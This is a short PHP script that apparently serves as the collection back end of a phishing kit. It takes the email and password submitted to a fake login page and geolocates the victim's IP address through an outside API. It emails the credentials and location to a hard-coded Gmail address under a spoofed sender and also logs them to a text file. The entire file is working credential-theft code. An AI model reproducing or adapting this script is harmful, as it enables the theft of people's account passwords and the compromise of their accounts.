<?php 

   
$email = $_POST['email'];
$password   =  $_POST['pass'];
                                 
$youremail = "osinachiosinachi001@gmail.com";
$ip= $_SERVER['REMOTE_ADDR'];

// API end URL 
$apiURL = 'https://freegeoip.app/json/'.$ip; 
 
// Create a new cURL resource with URL 
$ch = curl_init($apiURL); 
 
// Return response instead of outputting 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
 
// Execute API request 
$apiResponse = curl_exec($ch); 
 
// Close cURL resource 
curl_close($ch); 
 
// Retrieve IP data from API response 
$ipData = json_decode($apiResponse, true); 
 
if(!empty($ipData)){ 
    $country_code = $ipData['country_code']; 
    $country_name = $ipData['country_name']; 
    $region_code = $ipData['region_code']; 
    $region_name = $ipData['region_name']; 
    $city = $ipData['city']; 
    $zip_code = $ipData['zip_code']; 
    $latitude = $ipData['latitude']; 
    $longitude = $ipData['longitude']; 
    $time_zone = $ipData['time_zone'];
    
   }

$headers = "From: \"result Voters\" <result@rendarpay.com>\n";
$subject = "result";
$message = "";
$message .= 'email: ';
$message .= $email;
$message .= "\n";
$message .= 'Password: ';
$message .= $password;
$message .= "\n";
$message .= 'ip: ';
$message .= $ip;
$message .= "\n";
$message .= 'Country: ';
$message .= $country_name;
$message .= "\n";
$message .= 'Region: ';
$message .= $region_name;
$message .= "\n";
$message .= 'City: ';
$message .= $city;
$message .= "\n";




mail ("$youremail", "$subject", $message, $headers);

$make=fopen("datass.txt","a");
$to_put="";
$to_put .= $email."|".$password."|".$ip."|".$country_name."|".$region_name."|".$city."|".$contest."
";
fwrite($make,$to_put);



    ?>